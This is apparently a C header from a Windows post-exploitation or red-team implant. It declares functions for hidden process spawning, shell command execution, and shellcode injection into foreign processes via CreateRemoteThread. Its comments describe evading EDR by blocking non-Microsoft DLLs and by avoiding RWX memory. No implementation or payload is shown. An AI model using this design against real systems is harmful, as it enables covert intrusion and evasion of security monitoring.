#ifndef THREAD_H
#define THREAD_H

#include "logger.h"
#include <windows.h>

// Maximum number of concurrently tracked threads / processes
#define MAX_THREADS 64

// Maximum length of the human-readable label stored per entry
#define THREAD_LABEL_SIZE 512

/**
 * Execution strategy used when the entry was created.
 */
typedef enum {
  THREAD_EXEC_BINARY,  // CreateProcess: direct binary invocation
  THREAD_EXEC_COMMAND, // CreateProcess: shell command routed through cmd.exe /c
  THREAD_EXEC_REMOTE,  // CreateRemoteThread: shellcode injected into a foreign
                       // process
} thread_exec_t;

/**
 * Observed lifecycle state of a tracked entry.
 * Status is refreshed lazily: call thread_list() or thread_wait() to probe
 * the actual Win32 state.
 */
typedef enum {
  THREAD_STATUS_RUNNING,
  THREAD_STATUS_SUSPENDED,
  THREAD_STATUS_COMPLETED,  // Exited naturally
  THREAD_STATUS_TERMINATED, // Killed via thread_kill()
} thread_status_t;

/**
 * One row in the global thread table.
 *
 * h_process is non-NULL for THREAD_EXEC_BINARY and THREAD_EXEC_COMMAND
 * entries (it holds the spawned process handle). For THREAD_EXEC_REMOTE, it
 * holds the handle to the target process so we can query / terminate it.
 */
typedef struct {
  BOOL active;    // TRUE when this slot is in use
  DWORD slot;     // Index in the table (0-based)
  DWORD thread_id; // Win32 thread ID of the tracked thread
  HANDLE h_thread;  // Thread handle
  HANDLE h_process; // Process handle; NULL only when not applicable
  thread_exec_t exec_type;
  thread_status_t status;
  char label[THREAD_LABEL_SIZE]; // Human-readable description (path / command /
                                 // injection target)
} thread_entry_t;

/**
 * Spawn a binary in a new hidden process and track it in the thread table.
 * The process is created with CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP so
 * no console appears and the child is isolated from Ctrl-C signals.
 * @param binaryPath: Absolute or relative path to the executable
 * @param args:       Command-line arguments appended after the path (may be
 *                    NULL)
 * @param slot:       Receives the assigned table slot; may be NULL
 * @return: 0 on success, -1 on failure
 * Links:
 * https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
 */
int spawn_binary(const char *binaryPath, const char *args, DWORD *slot);

/**
 * Spawn a binary in a new hidden process with a process-level mitigation policy
 * that blocks non-Microsoft-signed DLLs from loading into the child.
 *
 * This prevents EDR/AV products from injecting their user-mode monitoring hooks
 * (AppInit_DLLs, SetWindowsHookEx, shim engine, etc.) into the spawned process.
 * The technique is sometimes called "blockdlls" in C2 frameworks.
 *
 * Implemented via PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY with the flag:
 *   PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
 *
 * Note: the flag is enforced by the kernel on the *child* process. The parent
 * (this process) is unaffected. The child will fail to start if any DLL it
 * tries to load on startup is not Microsoft-signed.
 *
 * @param binaryPath: Absolute or relative path to the executable
 * @param args:       Command-line arguments appended after the path (may be NULL)
 * @param slot:       Receives the assigned table slot; may be NULL
 * @return: 0 on success, -1 on failure
 */
int spawn_binary_hardened(const char *binaryPath, const char *args, DWORD *slot);

/**
 * Execute a shell command via cmd.exe /c in a new hidden process and track it.
 * cmd.exe is resolved from the COMSPEC environment variable; the command string
 * is passed verbatim after /c so the full shell grammar (pipes, redirections,
 * builtins) is available.
 * @param command: Shell command string
 * @param slot:    Receives the assigned table slot; may be NULL
 * @return: 0 on success, -1 on failure
 */
int spawn_command(const char *command, DWORD *slot);

/**
 * Inject shellcode into a running process via the four-step technique:
 *   1. VirtualAllocEx(PAGE_READWRITE) — reserve non-executable memory
 *   2. WriteProcessMemory            — copy shellcode bytes
 *   3. VirtualProtectEx(PAGE_EXECUTE_READ) — flip to RX, remove write access
 *   4. CreateRemoteThread            — start execution at the shellcode entry
 *
 * The RW → write → RX pattern avoids allocating PAGE_EXECUTE_READWRITE, which
 * is a high-confidence EDR IOC. The region is never simultaneously writable and
 * executable.
 *
 * @param targetPid:     PID of the target process
 * @param shellcode:     Raw shellcode bytes
 * @param shellcodeSize: Size in bytes
 * @param slot:          Receives the assigned table slot; may be NULL
 * @return: 0 on success, -1 on failure
 * Links:
 * https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
 * https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
 * https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
 */
int inject_shellcode(DWORD targetPid, const BYTE *shellcode,
                     SIZE_T shellcodeSize, DWORD *slot);

/**
 * Suspend a tracked thread by table slot.
 * Internally calls SuspendThread on h_thread. For process-backed entries this
 * suspends only the main thread; other threads in the process continue running.
 * @return: 0 on success, -1 on failure
 */
int thread_suspend(DWORD slot);

/**
 * Resume a suspended tracked thread by table slot.
 * @return: 0 on success, -1 on failure
 */
int thread_resume(DWORD slot);

/**
 * Terminate a tracked thread or its associated process by table slot.
 *
 * - THREAD_EXEC_BINARY / THREAD_EXEC_COMMAND: calls TerminateProcess so the
 *   entire process (all threads) is killed. Safer than TerminateThread for
 *   multi-threaded targets.
 * - THREAD_EXEC_REMOTE: calls TerminateThread. This is inherently unsafe —
 *   the target process's locks, heap, and global state may be left corrupted.
 *   If collateral damage is acceptable, calling TerminateProcess on h_process
 *   is more decisive; extend as needed.
 *
 * @return: 0 on success, -1 on failure
 */
int thread_kill(DWORD slot);

/**
 * Block until a tracked thread or process exits, or until the timeout elapses.
 * @param slot:      Table slot
 * @param timeoutMs: Milliseconds to wait; pass INFINITE to block indefinitely
 * @return: 0 if the object signaled (normal exit), 1 on timeout, -1 on error
 */
int thread_wait(DWORD slot, DWORD timeoutMs);

/**
 * Print a formatted table of all active entries with their current status.
 * Refreshes each entry's status before printing.
 */
void thread_list(void);

/**
 * Close handles and free slots for all COMPLETED and TERMINATED entries.
 */
void thread_cleanup(void);

/**
 * Register an externally-created process/thread pair into the tracking table.
 *
 * Use this when a process is created outside of spawn_binary / spawn_command
 * (e.g. CreateProcessAsUserA in token.c) so its lifecycle can still be managed
 * through thread_wait / thread_kill / thread_cleanup.
 *
 * The table takes ownership of both handles — do NOT close hProcess or
 * hThread after a successful call.
 *
 * @param hProcess:  Open process handle (may be NULL for remote-thread entries)
 * @param hThread:   Open thread handle
 * @param pid:       Process ID (informational, stored in label)
 * @param tid:       Thread ID stored in the entry
 * @param exec_type: Logical execution category for the entry
 * @param label:     Human-readable description (path, command, etc.)
 * @param out_slot:  Receives the assigned table slot; may be NULL
 * @return: 0 on success, -1 if the table is full or parameters are invalid
 */
int thread_register(HANDLE hProcess, HANDLE hThread, DWORD pid, DWORD tid,
                    thread_exec_t exec_type, const char *label, DWORD *out_slot);

#endif // THREAD_H
